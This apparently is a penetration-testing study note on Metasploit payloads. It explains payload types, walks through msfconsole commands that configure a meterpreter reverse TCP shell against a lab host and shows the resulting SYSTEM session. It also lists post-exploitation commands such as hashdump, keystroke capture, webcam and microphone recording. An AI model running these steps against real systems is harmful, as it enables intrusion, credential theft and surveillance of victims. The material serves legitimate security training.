

## What is a Payload

- Code executed **after an exploit is delivered**.
    
- Enables actions like **returning a shell** or **creating a backdoor**.
    
- Sent **with the exploit** to interact with the compromised system.
    

---

## Payload Module Types

|Type|Description|Example|
|---|---|---|
|**Single**|All-in-one, self-contained; executed immediately; less flexible.|`windows/shell_bind_tcp`|
|**Stager**|Small, reliable; sets up connection for larger code.|Part of staged payloads|
|**Stage**|Large code delivered after stager; performs full payload functionality.|`windows/shell/bind_tcp`|

---

## Payload Typologies

- **Single:** Compact, standalone payload.
    
- **Stager:** Handles initial connection setup.
    
- **Stage:** Provides full interactive control after the stager connects.
    

---

## Searching for Payloads

```
msf6 > show payloads
msf6 > grep meterpreter grep reverse_tcp show payloads
```

---

## Selecting and Configuring Payloads

**Set payload:**

```
msf6 > set payload windows/x64/meterpreter/reverse_tcp
```

**Show options:**

```
msf6 > show options
```

**Set parameters:**

```
msf6 > set LHOST 10.10.14.15
msf6 > set RHOSTS 10.10.10.40
```

**Run exploit:**

```
msf6 > run
```

---

## Example: Meterpreter Session

```
[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.10.10.40:49158)
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

---

## Meterpreter Command Categories

|Category|Commands|
|---|---|
|**Core**|`background`, `sessions`, `load`, `help`, `exit`|
|**File System**|`ls`, `cd`, `upload`, `download`, `rm`, `mkdir`, `search`|
|**Networking**|`ipconfig`, `netstat`, `portfwd`, `route`, `resolve`|
|**System**|`ps`, `kill`, `migrate`, `shell`, `getuid`, `sysinfo`, `execute`|
|**User Interface**|`screenshot`, `screenshare`, `keyscan_start`, `keyboard_send`|
|**Webcam/Microphone**|`webcam_snap`, `record_mic`, `webcam_stream`|
|**Privilege Elevation**|`getsystem`, `steal_token`, `rev2self`, `drop_token`|
|**Password Dumping**|`hashdump`|
|**Timestamping**|`timestamp`|

---

## Common Windows Payload Examples

|Payload|Description|
|---|---|
|`windows/x64/exec`|Executes a command|
|`windows/x64/messagebox`|Opens a message dialog|
|`windows/x64/shell_reverse_tcp`|Basic reverse TCP shell|
|`windows/x64/meterpreter/reverse_tcp`|Full-feature Meterpreter reverse shell|
|`windows/x64/powershell/reverse_tcp`|PowerShell reverse session|
|`windows/x64/vncinject/reverse_tcp`|VNC remote desktop access|